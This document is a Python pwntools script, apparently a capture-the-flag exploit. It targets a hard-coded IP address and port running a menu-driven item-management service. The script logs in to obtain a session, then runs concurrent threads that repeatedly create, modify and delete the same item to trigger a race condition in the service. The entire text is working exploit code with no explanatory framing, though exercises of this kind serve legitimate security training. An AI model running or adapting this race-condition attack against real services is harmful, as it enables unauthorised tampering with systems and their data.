#!/usr/bin/env python3
from pwn import *
import threading

HOST="164.90.193.27"
# HOST="localhost"
PORT=50009
REQUESTS=10

ITEM_NAME=b"MY_ITEM"


io = connect(HOST, PORT)
io.sendafter(b"3> Exit\n", b"1")
session = io.recvuntil(b"\n")
log.info(f"Session: {session.decode()}")
io.close()
    
def create_and_change(N=50):
    io = connect(HOST, PORT)
    io.sendafter(b"3> Exit\n", b"2")
    io.sendafter(b"ID: ", session)
    for i in range(N):
        io.sendafter(b"8> Logout\n", b"1")
        io.sendlineafter(b"name: ", ITEM_NAME)
        res = io.recv(4).decode()
        if res != "Item":
            log.info("Create and chage: already exists")
            io.sendafter(b"cost: ", b"228")
            io.sendafter(b"amount: ", b"1337")
        io.sendafter(b"8> Logout\n", b"5")
        io.sendlineafter(b"name: ", ITEM_NAME)
        res = io.recv(1)
        if res == "1":
            log.info("Create and chage: already deleted")
            continue
        io.send(b"228")
        io.sendafter(b"amount: ", b"69")
        log.info(f"Create and change: {i}")
    log.info(f"Create and change DONE")
    io.sendafter(b"8> Logout\n", b"7")
    proceeded = io.recvuntil(b"Logging out...\n").decode()
    log.info(proceeded)
    io.close()

def delete(N=50):
    io = connect(HOST, PORT)
    io.sendafter(b"3> Exit\n", b"2")
    io.sendafter(b"ID: ", session)
    for i in range(N):
        io.sendafter(b"8> Logout\n", b"3")
        io.sendafter(b"8> Logout\n", b"2")
        io.sendlineafter(b"name: ", ITEM_NAME)
        log.info(f"Delete: {i}")
    log.info(f"Delete DONE")
    io.close()
    
createN = 1
deleteN = 1
tCreate = [threading.Thread(target=create_and_change, args=(REQUESTS,)) for _ in range(createN)]
tDelete = [threading.Thread(target=delete, args=(REQUESTS*2,)) for _ in range(deleteN)]

for t in tCreate:
    t.start()
for t in tDelete:
    t.start()

for t in tCreate:
    t.join()
for t in tDelete:
    t.join()
